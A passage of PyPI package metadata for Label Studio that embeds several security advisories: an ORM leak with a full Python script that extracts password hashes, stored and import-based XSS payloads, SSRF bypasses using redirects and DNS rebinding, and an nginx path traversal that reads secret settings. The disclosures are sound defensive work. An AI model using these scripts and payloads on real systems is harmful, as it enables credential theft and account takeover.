`/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.5.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.5.1/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.12)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.5.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"7b99bf4275a3c553f54d152f97421766f049ce47ba2239fe9a751f426af79c16","md5":"02bc635414b514aee5fed21f9c515ce0","sha256":"10f554461e4024069dd514485d910637330ce0668204047797685ada523c9e2f"},"downloads":-1,"filename":"label_studio-0.5.1-py3-none-any.whl","has_sig":false,"md5_digest":"02bc635414b514aee5fed21f9c515ce0","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6920677,"upload_time":"2020-03-30T12:17:36","upload_time_iso_8601":"2020-03-30T12:17:36.423633Z","url":"https://files.pythonhosted.org/packages/7b/99/bf4275a3c553f54d152f97421766f049ce47ba2239fe9a751f426af79c16/label_studio-0.5.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"032c54c216ce7fcb848450e398d4938707574621835b8f6facfdcaafcf1bc8fd","md5":"47200d893e40bfb29791a768376af974","sha256":"b1463a58496363818ad44ca486b7bcad09f0342bedc899736ebce9c2e5e7b8f4"},"downloads":-1,"filename":"label-studio-0.5.1.tar.gz","has_sig":false,"md5_digest":"47200d893e40bfb29791a768376af974","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6868898,"upload_time":"2020-03-30T12:17:41","upload_time_iso_8601":"2020-03-30T12:17:41.342050Z","url":"https://files.pythonhosted.org/packages/03/2c/54c216ce7fcb848450e398d4938707574621835b8f6facfdcaafcf1bc8fd/label-studio-0.5.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by 